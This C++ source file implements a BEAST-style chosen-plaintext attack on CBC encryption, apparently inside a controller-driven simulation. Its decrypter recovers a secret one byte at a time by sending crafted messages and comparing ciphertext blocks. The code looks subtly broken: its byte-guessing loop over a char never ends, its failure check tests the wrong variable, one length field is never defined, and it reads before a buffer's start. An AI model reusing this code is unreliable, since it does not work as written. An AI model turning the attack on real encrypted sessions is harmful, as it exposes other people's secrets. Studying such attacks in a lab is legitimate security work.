#include "beast.h"
#include "../common/utils.h"

BeastDecrypter::BeastDecrypter(int max_len, int _block_size, T_Controller* _ctrl):block_size(_block_size), ctrl(_ctrl){
    buf = (char*)malloc(max_len);
    ori_recv = (char*)malloc(max_len);
    first_r = (char*)malloc(max_len);
    last_recv = (char*)malloc(max_len);
}

void BeastDecrypter::send_malicious_message(const char* buf, int len, char* recv){
    //TODO: the controller forces the sender to send the message to server
    // and give the encrypted message back to controller
    ctrl->send_client_instruction(T_Instr::ENCRYPTED_MESSAGE_TO_PEER, buf, len);
    int recv_len = ctrl->recv_server_message(recv);
    recv[recv_len] = '\0';
}

void BeastDecrypter::xor_block(const char* a, const char* b, const char* c, char* buf){
    int min_len = min(min(strlen(a), strlen(b)), strlen(c));
    if (min_len > max_len) exit(-1); // Assertion Failed for the storage
    for (int i=0; i<min_len; i++)
        buf[i] = a[i] ^ b[i] ^ c[i];
    buf[min_len]='\0';
}

bool BeastDecrypter::run(const std::string secret, const std::string known_head) {
    std::cout << "We have now started the beast decryption" << std::endl;
     // padding is the length we need to add to i_know to create a length of 15 bytes (block size- 1)
    int padding = block_size - (known_head.size() - 1) % block_size;
    char* p_guess = new char[secret.length() + 1];

    for(int i=known_head.size(); i < secret.size(); i++){
        std::string s;
        if (padding < 0)   
            s = secret.substr(-padding);
        else s = secret;

        p_guess[i+1] = '\0';
        for (char ch=0; ch<256; ch++) {

            std::string pad(padding, 'a');
            pad = pad + s;

            send_malicious_message( pad.c_str(), padding + s.length(), first_r);
            
            send_malicious_message( pad.c_str(), padding + s.length(), ori_recv);
            char* vector_init = ori_recv + (strlen(ori_recv) - block_size - 1);

            p_guess[i] = ch;

            xor_block(p_guess, first_r - block_size + 1, vector_init, buf);

            send_malicious_message(buf, strlen(buf), last_recv);

            if (check(ori_recv, last_recv, block_size)){
                padding--;
                break;
            }
            else if (i == 255){
                printf("Cannot find answer at %d bit\n", i);
                return false;
            }
        }
    }
    return true;

}